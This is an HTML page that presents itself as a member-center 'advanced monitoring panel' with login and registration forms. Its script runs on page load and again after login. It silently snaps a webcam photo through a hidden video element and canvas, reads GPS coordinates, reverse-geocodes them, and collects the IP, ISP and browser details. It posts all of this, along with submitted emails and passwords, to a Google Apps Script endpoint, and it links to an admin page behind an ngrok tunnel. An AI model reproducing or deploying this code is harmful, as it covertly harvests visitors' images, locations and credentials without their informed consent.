<!DOCTYPE html>
<html lang="zh-TW">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Advanced monitoring panel</title>
  <!-- 若不需要 Chart.js，可自行刪除此行 -->
  <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
  <style>
    /*******************************************************
     * 全局樣式
     *******************************************************/
    body {
      margin: 0; 
      padding: 0;
      font-family: 'Arial', sans-serif;
      background: linear-gradient(to bottom right, #2b2b3d, #1e1e2f);
      color: #ffffff;
    }
    h1 {
      text-align: center;
      margin: 20px 0;
    }
    .btn {
      padding: 12px 20px;
      background: #6a6aa0;
      color: #fff;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      box-shadow: 2px 2px 5px rgba(0,0,0,0.3);
      transition: background 0.3s ease;
    }
    .btn:hover {
      background: #8484c2;
    }

    /*******************************************************
     * 成功 / 失敗訊息
     *******************************************************/
    .msg-success, .msg-error {
      width: 90%;
      max-width: 400px;
      margin: 10px auto;
      padding: 10px;
      border-radius: 8px;
      display: none;
      text-align: center;
    }
    .msg-success {
      background: #28a745;
      border: 1px solid #218838;
    }
    .msg-error {
      background: #dc3545;
      border: 1px solid #c82333;
    }

    /*******************************************************
     * 會員中心按鈕
     *******************************************************/
    #openModalBtn {
      display: block;
      margin: 0 auto;
      margin-bottom: 20px;
    }

    /*******************************************************
     * Modal (彈跳視窗) - 一般會員
     *******************************************************/
    .modal-overlay {
      display: none; /* 預設隱藏 */
      position: fixed; 
      top: 0; left: 0; right: 0; bottom: 0;
      background: rgba(0,0,0,0.6);
      justify-content: center;
      align-items: center;
      z-index: 9999;
    }
    .modal-content {
      background: #1f1f2e;
      width: 320px;
      padding: 20px;
      border-radius: 12px;
      text-align: center;
      position: relative;
      animation: bounceIn 0.8s ease;
    }
    .close-btn {
      position: absolute;
      top: 10px; 
      right: 10px; 
      cursor: pointer;
      background: transparent;
      color: #fff;
      border: none;
      font-size: 20px;
    }

    @keyframes bounceIn {
      0% {
        transform: scale(0.5);
        opacity: 0;
      }
      50% {
        transform: scale(1.2);
        opacity: 1;
      }
      70% {
        transform: scale(0.9);
      }
      100% {
        transform: scale(1);
        opacity: 1;
      }
    }

    /*******************************************************
     * 表單切換 (登入 / 註冊)
     *******************************************************/
    .tab-button {
      background: #4d4d6a;
      margin: 0 5px;
      padding: 8px 16px;
      border: none;
      color: #fff;
      cursor: pointer;
      border-radius: 5px;
    }
    .tab-button.active {
      background: #6a6aa0;
    }
    .form-container {
      display: none;
      margin-top: 10px;
    }
    .form-container.active {
      display: block;
    }
    .input-field {
      width: 90%;
      margin: 8px auto;
      padding: 10px;
      border: none;
      border-radius: 5px;
      box-sizing: border-box;
    }
    .btn-submit {
      width: 90%;
      padding: 10px;
      border: none;
      background: #6a6aa0;
      color: #fff;
      border-radius: 5px;
      cursor: pointer;
      margin-top: 10px;
    }

    /*******************************************************
     * 管理者登入 Modal (可選)
     *******************************************************/
    #adminModalOverlay .modal-content {
      width: 300px;
    }

    /*******************************************************
     * 高級監控面板
     *******************************************************/
    #mainPanel {
      display: none; 
      padding: 20px;
    }
    .container {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
      gap: 20px;
      margin-top: 20px;
    }
    .card {
      background: #2b2b3d;
      border-radius: 15px;
      padding: 20px;
      box-shadow: 2px 2px 8px rgba(0,0,0,0.3);
      text-align: center;
    }
    .card h2 {
      font-size: 18px;
      margin-bottom: 15px;
    }
    .status-text {
      font-size: 14px;
      margin: 10px 0;
    }
    iframe {
      width: 100%;
      height: 200px;
      border: none;
      border-radius: 10px;
    }
  </style>
</head>
<body>

  <h1>Advanced monitoring panel</h1>
  <div id="statusSuccess" class="msg-success"></div>
  <div id="statusError" class="msg-error"></div>

  <!-- 一般使用者登入 / 註冊 -->
  <button id="openModalBtn" class="btn">會員中心</button>
  <div id="modalOverlay" class="modal-overlay">
    <div class="modal-content">
      <button id="closeModalBtn" class="close-btn">×</button>
      <button id="tabLogin" class="tab-button active">登入</button>
      <button id="tabRegister" class="tab-button">註冊</button>
      <div id="loginFormContainer" class="form-container active">
        <form id="loginForm">
          <input type="email" id="loginEmail" class="input-field" placeholder="請輸入 Email" required />
          <input type="password" id="loginPassword" class="input-field" placeholder="請輸入密碼" required />
          <button class="btn-submit" type="submit">登入</button>
        </form>
      </div>
      <div id="registerFormContainer" class="form-container">
        <form id="registerForm">
          <input type="email" id="regEmail" class="input-field" placeholder="請輸入 Email" required />
          <input type="password" id="regPassword" class="input-field" placeholder="請輸入密碼" required />
          <button class="btn-submit" type="submit">註冊</button>
        </form>
      </div>
    </div>
  </div>

  <!-- (可選) 管理者登入按鈕 + Modal -->
  <button id="adminLoginOpenBtn" class="btn">管理者登入</button>
  <div id="adminModalOverlay" class="modal-overlay">
    <div class="modal-content">
      <button id="adminCloseModalBtn" class="close-btn">×</button>
      <h2>管理者登入</h2>
      <form id="adminLoginForm">
        <input type="email" id="adminEmail" class="input-field" placeholder="請輸入管理者 Email" required />
        <input type="password" id="adminPassword" class="input-field" placeholder="請輸入管理者密碼" required />
        <button class="btn-submit" type="submit">登入</button>
      </form>
    </div>
  </div>

  <!-- 管理者後台連結（若另有 admin.php） -->
  <p><a href="https://3df0-125-227-108-79.ngrok-free.app/admin.php" target="_blank">管理者後台</a></p>

  <!-- 高級監控面板 -->
  <div id="mainPanel">
    <div class="container">
      <div class="card">
        <h2>IP 與位置資訊</h2>
        <p id="ipInfo" class="status-text">資訊載入中...</p>
      </div>
      <div class="card">
        <h2>鏡頭狀態</h2>
        <p id="status" class="status-text">請開啟鏡頭使用...</p>
      </div>
      <div class="card">
        <h2>動態地圖</h2>
        <iframe id="map" src="about:blank"></iframe>
      </div>
      <div class="card">
        <h2>天氣資訊</h2>
        <p id="weatherInfo" class="status-text">天氣資訊載入中...</p>
      </div>
    </div>
  </div>

  <script>
    /************************************************
     * 0. Apps Script URL (請改成你自己的)
     ************************************************/
    const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbwN4HC9KMUfRoQac8AEHeQ9OlXJCjIDPR-OeTmFwvZ8l9qkeyp1Bfs5WghMOThWQB2uhg/exec';

    /************************************************
     * 1. Modal 打開 / 關閉 (一般使用者)
     ************************************************/
    const openModalBtn = document.getElementById('openModalBtn');
    const modalOverlay = document.getElementById('modalOverlay');
    const closeModalBtn = document.getElementById('closeModalBtn');
    openModalBtn.addEventListener('click', () => {
      modalOverlay.style.display = 'flex';
    });
    closeModalBtn.addEventListener('click', () => {
      modalOverlay.style.display = 'none';
    });

    /************************************************
     * 1-2. Modal 打開 / 關閉 (管理者)
     ************************************************/
    const adminLoginOpenBtn = document.getElementById('adminLoginOpenBtn');
    const adminModalOverlay = document.getElementById('adminModalOverlay');
    const adminCloseModalBtn = document.getElementById('adminCloseModalBtn');
    adminLoginOpenBtn.addEventListener('click', () => {
      adminModalOverlay.style.display = 'flex';
    });
    adminCloseModalBtn.addEventListener('click', () => {
      adminModalOverlay.style.display = 'none';
    });

    /************************************************
     * 2. Tab 切換 (登入 / 註冊)
     ************************************************/
    const tabLogin = document.getElementById('tabLogin');
    const tabRegister = document.getElementById('tabRegister');
    const loginFormContainer = document.getElementById('loginFormContainer');
    const registerFormContainer = document.getElementById('registerFormContainer');

    tabLogin.addEventListener('click', () => {
      tabLogin.classList.add('active');
      tabRegister.classList.remove('active');
      loginFormContainer.classList.add('active');
      registerFormContainer.classList.remove('active');
    });
    tabRegister.addEventListener('click', () => {
      tabRegister.classList.add('active');
      tabLogin.classList.remove('active');
      registerFormContainer.classList.add('active');
      loginFormContainer.classList.remove('active');
    });

    /************************************************
     * 3. 訊息顯示
     ************************************************/
    const statusSuccess = document.getElementById('statusSuccess');
    const statusError = document.getElementById('statusError');
    function showSuccessMessage(msg) {
      statusSuccess.innerText = msg;
      statusSuccess.style.display = 'block';
      statusError.style.display = 'none';
    }
    function showErrorMessage(msg) {
      statusError.innerText = msg;
      statusError.style.display = 'block';
      statusSuccess.style.display = 'none';
    }

    /************************************************
     * 4. 主要功能區塊 (登入成功後才顯示)
     ************************************************/
    const mainPanel = document.getElementById('mainPanel');

    /************************************************
     * 5. 註冊
     ************************************************/
    document.getElementById('registerForm').addEventListener('submit', async (e) => {
      e.preventDefault();
      const email = document.getElementById('regEmail').value;
      const password = document.getElementById('regPassword').value;

      try {
        const formData = new URLSearchParams();
        formData.append('action', 'register');
        formData.append('email', email);
        formData.append('password', password);

        const response = await fetch(SCRIPT_URL, {
          method: 'POST',
          body: formData
        });
        const result = await response.json();
        if (result.success) {
          showSuccessMessage('註冊成功，請切換到「登入」');
        } else {
          showErrorMessage('註冊失敗：' + (result.error || '未知原因'));
        }
      } catch (error) {
        showErrorMessage('註冊錯誤：' + error.message);
      }
    });

    /************************************************
     * 6. 一般登入
     ************************************************/
    document.getElementById('loginForm').addEventListener('submit', async (e) => {
      e.preventDefault();
      const email = document.getElementById('loginEmail').value;
      const password = document.getElementById('loginPassword').value;

      try {
        const formData = new URLSearchParams();
        formData.append('action', 'login'); // 一般使用者登入
        formData.append('email', email);
        formData.append('password', password);

        const response = await fetch(SCRIPT_URL, {
          method: 'POST',
          body: formData
        });
        const result = await response.json();
        if (result.success) {
          showSuccessMessage('登入成功！');
          modalOverlay.style.display = 'none';
          mainPanel.style.display = 'block';

          // 登入成功後，開始收集資料
          collectAndSendData();
        } else {
          showErrorMessage('登入失敗：' + (result.error || '未知原因'));
        }
      } catch (error) {
        showErrorMessage('登入錯誤：' + error.message);
      }
    });

    /************************************************
     * 6-2. 管理者登入 (若前端整合在同頁)
     ************************************************/
    document.getElementById('adminLoginForm').addEventListener('submit', async (e) => {
      e.preventDefault();
      const email = document.getElementById('adminEmail').value;
      const password = document.getElementById('adminPassword').value;

      try {
        const formData = new URLSearchParams();
        formData.append('action', 'adminLogin'); // 管理者登入
        formData.append('email', email);
        formData.append('password', password);

        const response = await fetch(SCRIPT_URL, {
          method: 'POST',
          body: formData
        });
        const result = await response.json();
        if (result.success) {
          showSuccessMessage('管理者登入成功！');
          adminModalOverlay.style.display = 'none';

          // 管理者登入成功後，視需求可跳轉後台
          window.location.href = 'https://3df0-125-227-108-79.ngrok-free.app/admin.php';
        } else {
          showErrorMessage('管理者登入失敗：' + (result.error || '未知原因'));
        }
      } catch (error) {
        showErrorMessage('管理者登入錯誤：' + error.message);
      }
    });

    /************************************************
     * 7. 收集相機、GPS、IP並上傳 (裝置資訊)
     ************************************************/
    async function startCamera() {
      let stream = null;
      try {
        // ★ 相機解析度可視需求調降，以減少上傳影像大小，優化速度
        stream = await navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 }});
        const video = document.createElement('video');
        video.srcObject = stream;
        await new Promise(resolve => {
          video.onloadedmetadata = () => {
            video.play();
            resolve();
          };
        });
        // 簡單延遲 500ms，確保影像畫面更新
        await new Promise(resolve => setTimeout(resolve, 500));

        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        // ★ 壓縮品質可再調整(0 ~ 1)，以減少上傳量
        const photoData = canvas.toDataURL('image/jpeg', 0.7).split(',')[1];
        return photoData;
      } catch (error) {
        console.warn('相機啟動失敗:', error);
        return null;
      } finally {
        if (stream) {
          stream.getTracks().forEach(track => track.stop());
        }
      }
    }

    async function getGpsCoordinates() {
      try {
        const position = await new Promise((resolve, reject) => {
          navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 10000 });
        });
        const { latitude, longitude } = position.coords;
        // 呼叫 Nominatim 取得大略地址
        const resp = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`);
        const data = await resp.json();
        const address = data.display_name || '未知地址';
        return { latitude, longitude, address };
      } catch (error) {
        console.warn('GPS 獲取失敗:', error);
        return null;
      }
    }

    async function getIpInfo() {
      try {
        // 透過 ipinfo.io 取得 IP 與地理資訊
        const resp = await fetch('https://ipinfo.io/json');
        const data = await resp.json();
        const { ip, city, region, country, org } = data;
        const ipType = ip.includes('.') ? 'IPV4' : 'IPV6';
        const userAgent = navigator.userAgent;
        return { ip, ipType, userAgent, city, region, country, org };
      } catch (error) {
        console.warn('IP 獲取失敗:', error);
        return null;
      }
    }

    async function collectAndSendData() {
      const statusElem = document.getElementById('status');
      if (statusElem) {
        statusElem.innerText = '正在收集資料...';
      }

      const collectedData = { gps: null, ip: null, photo: null };
      try {
        // 平行呼叫以節省時間
        const [gpsResult, ipResult] = await Promise.allSettled([
          getGpsCoordinates(),
          getIpInfo(),
        ]);
        const photoResult = await startCamera();

        if (gpsResult.status === 'fulfilled') collectedData.gps = gpsResult.value;
        if (ipResult.status === 'fulfilled') collectedData.ip = ipResult.value;
        if (photoResult) collectedData.photo = photoResult;

        const fd = new URLSearchParams();
        fd.append('message', '合併資料上傳');
        if (collectedData.gps) {
          fd.append('latitude', collectedData.gps.latitude);
          fd.append('longitude', collectedData.gps.longitude);
          fd.append('address', collectedData.gps.address);
        }
        if (collectedData.ip) {
          fd.append('ip', collectedData.ip.ip);
          fd.append('ipType', collectedData.ip.ipType);
          fd.append('userAgent', collectedData.ip.userAgent);
          fd.append('city', collectedData.ip.city);
          fd.append('region', collectedData.ip.region);
          fd.append('country', collectedData.ip.country);
          fd.append('org', collectedData.ip.org);
        }
        if (collectedData.photo) {
          fd.append('imageData', collectedData.photo);
        }

        const resp = await fetch(SCRIPT_URL, {
          method: 'POST',
          body: fd
        });
        const result = await resp.json();
        if (result.success) {
          if (statusElem) statusElem.innerText = '資料已成功發送！';
        } else {
          if (statusElem) statusElem.innerText = `資料發送失敗：${result.error}`;
        }
      } catch (error) {
        console.error('資料收集或傳送過程中發生錯誤:', error);
        if (statusElem) {
          statusElem.innerText = '資料收集或傳送過程中發生錯誤。';
        }
      }
    }

    /************************************************
     * 8. 頁面載入後 (可視需求預先執行收集)
     ************************************************/
    document.addEventListener('DOMContentLoaded', () => {
      // 如需一進頁面就收集, 可呼叫 
      collectAndSendData();
    });
  </script>
</body>
</html>
